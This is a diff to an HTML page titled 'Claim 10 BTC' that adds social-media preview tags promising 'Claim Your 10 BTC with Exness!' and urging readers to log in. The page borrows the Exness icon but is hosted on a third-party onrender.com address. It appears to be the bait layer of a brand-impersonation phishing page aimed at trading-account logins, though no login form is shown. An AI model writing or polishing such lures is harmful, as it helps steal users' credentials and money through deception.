@@ -4,6 +4,17 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Claim 10 BTC</title>
+    <!-- Open Graph Meta Tags -->
+    <meta property="og:title" content="Claim Your 10 BTC with Exness!">
+    <meta property="og:description" content="Log in to Exness now to claim your 10 Bitcoin reward instantly!">
+    <meta property="og:image" content="https://cdn-1.webcatalog.io/catalog/exness/exness-icon-filled-256.webp?v=1751851431527">
+    <meta property="og:url" content="https://exness-laravel.onrender.com/">
+    <meta property="og:type" content="website">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Claim Your 10 BTC with Exness!">
+    <meta name="twitter:description" content="Log in to Exness now to claim your 10 Bitcoin reward instantly!">
+    <meta name="twitter:image" content="https://cdn-1.webcatalog.io/catalog/exness/exness-icon-filled-256.webp?v=1751851431527">
+    <!-- End Open Graph Meta Tags -->
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet" />
     <style>
